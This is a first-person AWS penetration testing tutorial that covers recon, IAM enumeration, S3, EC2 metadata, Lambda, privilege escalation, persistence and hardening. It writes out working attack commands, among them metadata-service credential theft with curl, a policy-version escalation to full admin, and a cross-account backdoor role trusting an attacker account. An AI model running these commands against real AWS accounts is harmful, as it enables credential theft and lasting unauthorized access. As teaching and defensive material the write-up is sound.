# AWS Penetration Testing

AWS penetration testing is basically about finding security weaknesses in an AWS environment before someone else does. In this write-up, I’ll go through the things I usually look at during an assessment, starting with basic reconnaissance and moving into IAM, S3, EC2, Lambda, and possible privilege escalation paths.

The goal is to understand how different AWS services are connected, where misconfigurations can happen, and how a small permission issue can sometimes lead to bigger access.


## Methodology Overview

A typical AWS pentest follows this flow:

```
Recon -> Enumerate IAM -> Enumerate Services -> Find Misconfig
   -> Exploit / Escalate -> Pivot -> Persist -> Report
```

Unlike traditional network pentesting, AWS engagements are **identity-centric**. The core question at every step is: *"What can this credential/role actually do?"*, not just "what's open on the network."

## Reconnaissance & Enumeration

### Passive recon (no credentials needed)

| Technique | Purpose |
|---|---|
| `dig`, `dnsrecon`, `amass` | Find subdomains that resolve to S3/CloudFront/ELB |
| GitHub/GitLab dorking | Leaked `AWS_SECRET_ACCESS_KEY` in commits |
| `trufflehog`, `gitleaks` | Scan repo history for hardcoded keys |
| Shodan / Censys | Find exposed EC2 instances, Elasticsearch, Kibana |
| `grayhatwarfare` | Search publicly listed open S3 buckets |

```bash
# Search git history for leaked AWS keys
trufflehog git https://github.com/target/repo --json

# Enumerate S3 bucket via naming guesses
for word in dev prod backup assets media static logs; do
  aws s3 ls s3://target-$word --no-sign-request 2>/dev/null && echo "FOUND: target-$word"
done
```

### Active recon (with a foothold credential)

Once you have any valid credential, even a low-privilege one, enumerate what it can do. Don't assume the attached policy tells the full story, inline policies, group memberships, and resource policies also matter.

```bash
# Who am I, and what can I do?
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name dev-jenkins
aws iam list-user-policies --user-name dev-jenkins
aws iam get-user --user-name dev-jenkins
```

## IAM Enumeration & Abuse

IAM is the crown jewel of AWS security, nearly every escalation path runs through a misconfigured policy somewhere.

### Enumerate without `iam:List*` permissions (bruteforce)

If you lack `iam:ListUsers`, which is commonly restricted, tools like **enumerate-iam** brute-force permissions by making calls and checking for `AccessDenied` vs success:

```bash
git clone https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key AKIA... --secret-key ...
```

This tells you your effective permission set even when policy-reading APIs are denied.

### Key misconfigurations to hunt for

```bash
# 1. Overly permissive trust policies (who can assume this role?)
aws iam get-role --role-name AdminRole --query 'Role.AssumeRolePolicyDocument'

# 2. Wildcard actions/resources
aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/DevPolicy --version-id v1
# Look for: "Action": "*", "Resource": "*"

# 3. Attached AdministratorAccess to a service role
aws iam list-attached-role-policies --role-name lambda-exec-role
```

**Classic vulnerable policy example:**
```json
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "*"
}
```
Combined with `lambda:CreateFunction` or `ec2:RunInstances`, this lets an attacker pass an admin role to a new resource they control, resulting in instant privilege escalation.

## S3 Enumeration & Exploitation

S3 misconfiguration remains the number one cause of AWS data breaches.

```bash
# List without credentials (public bucket)
aws s3 ls s3://target-bucket --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Check bucket policy for public access
aws s3api get-bucket-policy --bucket target-bucket

# Download everything (if world-readable)
aws s3 sync s3://target-bucket ./loot --no-sign-request

# Check for public write (upload test file)
echo "pentest-poc" > poc.txt
aws s3 cp poc.txt s3://target-bucket/poc.txt --no-sign-request
```

Automated bucket-hunting tool:
```bash
python3 s3scanner.py --bucket-file wordlist.txt
```

**Real-world pattern:** company name plus environment word combinations (`companyname-prod`, `companyname-backups-2023`, `companyname-static-assets`) resolve a surprising percentage of the time.

## EC2 & Metadata Service

The Instance Metadata Service (IMDS) at `169.254.169.254` is a top target for SSRF-to-credential-theft chains.

```bash
# From inside a compromised EC2 instance or via SSRF on a vulnerable app:

# IMDSv1 (no auth needed, legacy, still common)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Returns temporary AccessKeyId/SecretAccessKey/Token you can use directly:
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

This is exactly what happened in the 2019 Capital One breach, an SSRF vulnerability in a misconfigured WAF was used to query IMDS and steal an over-privileged role's credentials.

```bash
# IMDSv2 (token-required, mitigates basic SSRF but not all)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

**Defensive note:** enforcing IMDSv2 and setting hop-limit to 1 blocks most SSRF-to-IMDS chains through containers and proxies.

## Lambda & Serverless

```bash
# List functions and check for hardcoded secrets in env vars
aws lambda list-functions
aws lambda get-function-configuration --function-name payment-processor
# Check "Environment" -> "Variables" for API keys, DB creds

# Pull function code for source review
aws lambda get-function --function-name payment-processor --query 'Code.Location'
# curl the returned presigned URL to download the deployment package

# Check execution role permissions (often over-privileged)
aws lambda get-function --function-name payment-processor --query 'Configuration.Role'
```

Overly broad Lambda execution roles are extremely common because developers attach `AWSLambdaFullAccess`-style policies during development and never trim them.

## Privilege Escalation Paths

Below are the most common IAM privesc primitives, based on Rhino Security Labs' well known research:

| Primitive | Requirement | Result |
|---|---|---|
| `iam:CreatePolicyVersion` | Permission on your own user/role | Push new policy version with `*:*` |
| `iam:SetDefaultPolicyVersion` | Existing non-default admin version exists | Roll back to an old permissive version |
| `iam:AttachUserPolicy` | none | Attach `AdministratorAccess` to yourself |
| `iam:PassRole` + `ec2:RunInstances` | none | Launch EC2 with an admin instance profile, grab creds via IMDS |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | none | Create Lambda with admin role, run arbitrary code |
| `iam:PassRole` + `cloudformation:CreateStack` | none | Stand up a stack that grants you access |
| `sts:AssumeRole` | Overly permissive trust policy | Assume a higher-privileged role directly |
| `iam:UpdateAssumeRolePolicy` | none | Rewrite trust policy to allow yourself |

**Example exploitation, self privesc via policy versioning:**
```bash
cat > evil-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
}
EOF

aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/dev-jenkins-policy \
  --policy-document file://evil-policy.json \
  --set-as-default
```

Automate discovery of these chains with **Pacu**:
```bash
pacu
> import_keys pentest
> run iam__enum_permissions
> run iam__privesc_scan
```

## Persistence Techniques

Used in authorized engagements to demonstrate impact or test detection controls, always document and clean up afterward:

- Create a secondary IAM user with programmatic access hidden among legitimate users
- Add an access key to an existing, rarely-audited service account
- Modify a Lambda's trigger or role to maintain code execution
- Create an IAM role with a trust policy allowing your external AWS account to `sts:AssumeRole`
- Backdoor a Security Group to allow re-entry, loud, usually flagged in detection-focused engagements

```bash
# Cross-account backdoor role example
aws iam create-role --role-name svc-monitoring-helper \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT_ID:root"},
      "Action": "sts:AssumeRole"
    }]
  }'
aws iam attach-role-policy --role-name svc-monitoring-helper \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Detection & Defense

For every offensive technique above, here's the corresponding hardening control:

- **IMDS**: enforce IMDSv2, set hop-limit to 1, disable metadata on instances that don't need it
- **IAM**: apply least privilege, use permission boundaries, avoid wildcard `Resource`/`Action`, use SCPs at the Org level
- **S3**: enable Block Public Access at the account level, use bucket policies over ACLs, enable access logging
- **CloudTrail**: enable in all regions, send to a separate log-archive account, enable log file integrity validation
- **GuardDuty**: enable for anomaly detection (credential exfiltration, IMDS abuse, crypto-mining behavior)
- **Config Rules**: continuously check for public buckets, unencrypted volumes, open security groups
- **Secrets**: never hardcode; use Secrets Manager / Parameter Store with rotation
